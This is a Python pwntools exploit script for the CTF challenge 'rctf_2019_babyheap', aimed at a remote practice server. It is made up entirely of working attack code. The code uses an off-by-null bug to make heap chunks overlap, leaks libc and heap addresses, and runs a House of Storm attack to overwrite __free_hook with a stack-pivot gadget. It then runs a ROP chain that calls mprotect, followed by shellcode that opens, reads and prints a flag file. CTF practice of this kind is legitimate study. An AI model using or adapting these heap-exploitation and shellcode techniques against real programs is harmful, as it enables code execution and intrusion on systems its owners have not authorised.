from pwn import *
r = remote('node3.buuoj.cn',27621)
#r = process('./rctf_2019_babyheap')
libc = ELF('/libc-2.23.so')
elf = ELF('./rctf_2019_babyheap')

def add(size):
	r.recvuntil('Choice: ')
	r.sendline('1')
	r.recvuntil('Size: ')
	r.sendline(str(size))

def edit(index,data):
	r.recvuntil('Choice: ')
	r.sendline('2')
	r.recvuntil('Index: ')
	r.sendline(str(index))
	r.recvuntil('Content: ')
	r.sendline(data)

def delete(index):
	r.recvuntil('Choice: ')
	r.sendline('3')
	r.recvuntil('Index: ')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Choice: ')
	r.sendline('4')
	r.recvuntil('Index: ')
	r.sendline(str(index))


##init
add(0x70) #0
add(0x38) #1
add(0x420) #2
add(0x30) #3
add(0x60) #4
add(0x20) #5

add(0x88) #6
add(0x48) #7
add(0x420) #8
add(0x20) #9

add(0x100) #10 gadget
add(0x400) #11 payload+shellcode


delete(0)
edit(2,'a'*0x3f0+p64(0x100)+p64(0x31)) #chunk 2(0x430):0x400+0x30
edit(1,'a'*0x30+p64(0x80+0x40)) #off by null prev_size:0xc0, size:0x430->0x400
delete(2) #idx0~idx2 into unsorted bin  0x400+0xc0=0x4c0


add(0x70) #0

show(1)
leak= u64(r.recvn(6).ljust(8,'\x00'))
libc_base = leak - 0x3c4b78
log.success(hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']

##leak heap_base
add(0x30) #2==1
delete(4)
delete(2) #usortedbin:0x440->0x70
show(1)
heap_base = u64(r.recvn(6).ljust(8,'\x00'))-0x530
log.success(hex(heap_base))


##calloc from unsortedbin 0x70,0x440 put into largebin
add(0x50) #2 

delete(6) #0x90
edit(8,'a'*0x3f0+p64(0x100)+p64(0x31)) #chunk8(0x430):0x400+0x30
edit(7,'a'*0x40+p64(0x90+0x50)) #off by null prev_size:0xe0, size:0x400
delete(8) #idx6~idx8 into unsorted bin 0x400+0xe0=0x4e0


add(0x430) #4==1 calloc from largebin
add(0x88) #6
add(0x440) #8==7


##unsorted bin attack
delete(4)
delete(8) #0x450->0x440
add(0x440) #4==7
delete(4) #0x450 put into unsortedbin, 0x440 put into largebin
edit(7,p64(0)+p64(free_hook-0x20)) #0x450
edit(1,p64(0)+p64(free_hook-0x20+0x8)+p64(0)+p64(free_hook-0x20-0x18-0x5))#0x440

add(0x48)#House of Strom

edit(4,'a'*0x10+p64(libc_base + 0x47b75)) #mov rsp,[rdi+0xa0];mov rcx,[rdi+0xa8];push rcx
##rsp:chunk 11's data start
##rcx:retn

pop_rdi_ret = libc_base+0x21102
pop_rdx_rsi_ret = libc_base+0x1150c9
payload = p64(pop_rdi_ret) + p64(heap_base)
payload += p64(pop_rdx_rsi_ret) + p64(7) + p64(0x2000) + p64(libc_base+libc.symbols['mprotect'])
payload += p64(heap_base+0x48+0xc20)



code = '''
mov rax,SYS_open
push 0x67616c66
mov rdi,rsp
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x50
mov rax,SYS_read
syscall
mov rdi,1
mov rsi,rsp
mov rdx,0x50
mov rax,SYS_write
syscall
'''
shellcode = asm(code,arch='amd64')
payload += shellcode
edit(11,payload)
edit(10,'a'*0xa0+p64(heap_base+0x10+0xc20)+p64(0x209b5+libc_base))



delete(10)
r.interactive()